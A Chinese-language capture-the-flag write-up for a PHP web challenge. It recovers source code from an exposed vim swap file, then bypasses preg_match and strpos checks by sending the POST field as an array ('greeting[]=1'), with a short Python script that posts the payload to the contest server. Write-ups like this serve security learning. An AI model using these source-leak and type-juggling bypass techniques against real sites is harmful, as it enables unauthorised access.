web php - 2018i春秋圣诞欢乐赛
====

WriteUp
----
1. 题目 hint 里面提到了使用 vim 编辑这一点，不由得联想到 swp 文件。直接访问 `.index.php.swp`，得到 `index.php` 的 swp 文件。
2. 使用 `vim -r index.php` 命令恢复 swp 文件，得到 `index.php` 的源码。
    ```php
    <?php
    function areyouok($greeting){
        return preg_match('/Merry.*Christmas/is',$greeting);
    }

    $greeting=@$_POST['greeting'];
    if(!areyouok($greeting)){
        if(strpos($greeting,'Merry Christmas')!==false){
            echo 'Merry Christmas. '.'flag{xxxxxx}';
        }else{
            echo 'Do you know .swp file?';
        }
    }else{
        echo 'Do you know PHP?';
    }
    ?>
    ```
3. 审阅 `index.php` 源码，发现两个矛盾。首先 `preg_match` 函数不能匹配到 `/Merry Christmas/is` 模式串。然而后面 `strpos` 函数需要在字符串中找到 `Merry Christmas` 这一字符串。
4. 不由得想到 PHP 中某些函数的参数传入不正确时，并不会 error，而是 warning，并且返回一个值。  
`preg_match` 函数的第二个参数收到 `array` 时 warning，并且返回 `false`；  
`strpos` 函数的一个参数收到 `array` 时 warning，并且返回 `NULL`；  
于是乎这两个函数只要我们 POST 请求中的 greeting 字段设置为数组，也就是 `greeting[]` 就可以绕过这两个验证。
5. 构造 payload：`greeting[]=1`，得到 flag。

Script
----
```python
#!/usr/bin/python3
#coding:utf-8

import requests

r = requests.post('http://106.75.66.87/index.php', data={
    'greeting[]': 1
})

print(r.text)
```